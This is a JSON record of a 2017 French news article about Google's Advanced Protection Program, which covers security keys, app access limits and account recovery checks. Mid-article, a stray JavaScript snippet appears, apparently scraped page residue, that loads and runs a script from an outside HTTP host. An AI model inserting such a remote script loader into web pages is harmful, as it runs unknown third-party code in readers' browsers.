{"title": "Google lance un programme de protection contre les attaques ciblees", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-10-19", "content": "Destine aux << individus les plus susceptibles de faire l'objet d'attaques ciblees >>, notamment les journalistes, chefs d'entreprise ou les equipes de campagnes electorales, le nouveau programme de protection avancee que propose Google offre plusieurs options de securite poussee, comme le recours a une cle de securite physique pour se connecter a un compte. Google  propose desormais un programme de protection specifique aux personnes susceptibles d'etre la cible d'attaques cyber en raison de leur profession, de leur engagement politique, d'un activisme ou qui ont tout simplement besoin de se proteger d'une situation dangereuse. On pense aux journalistes, militants,  lanceurs  d'alerte, etc. Mais Google dit s'adresser egalement aux chefs d'entreprise et aux equipes de campagnes electorales. On se souvient des affaires de piratage des courriels d'un membre de l'equipe d'Hillary Clinton durant la campagne de l'election presidentielle aux Etats-Unis. Quelques mois plus tard, ce sont les emails de la campagne En Marche ! d' Emmanuel Macron  qui se retrouvaient mis en ligne a quelques heures du second tour de l'election presidentielle francaise. Pour son << Programme de protection avancee >>,  Google  propose trois outils. D'abord, l'acces a un compte Google valide par le recours a une cle de securite  physique  U2F ( Universal Second Factor ) Fido ( Fast IDentity Online ) qu'il faut utiliser conjointement avec le  navigateur  Chrome. Sur un  ordinateur , la cle sera au format  USB  tandis que sur un  smartphone  il faudra acquerir une  cle U2F  compatible  Bluetooth  associee a une  application .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les applications iOS ne pourront plus acceder a Gmail, Contacts ni Agenda Le second rempart consiste a restreindre l'acces des applications tierces aux services Google comme  Gmail  et Drive afin d'eviter qu'elles ne soient exploitees comme vecteurs d'attaque par des pirates.  Chrome  sera le seul navigateur accepte pour se connecter a un service Google.  <<  Si vous etes un utilisateur d' iOS , vos applications iOS ne pourront plus acceder a  Gmail , Contacts ni Agenda  >>, precise Google qui ajoute que ces restrictions seront ulterieurement assouplies pour des partenaires de confiance. Le dernier  garde-fou  mis en place dans le cadre de ce programme est une procedure de verification approfondie en cas de perte d'identifiants a un compte Google afin de prevenir toute usurpation d'identite. ", "theme": "tech"}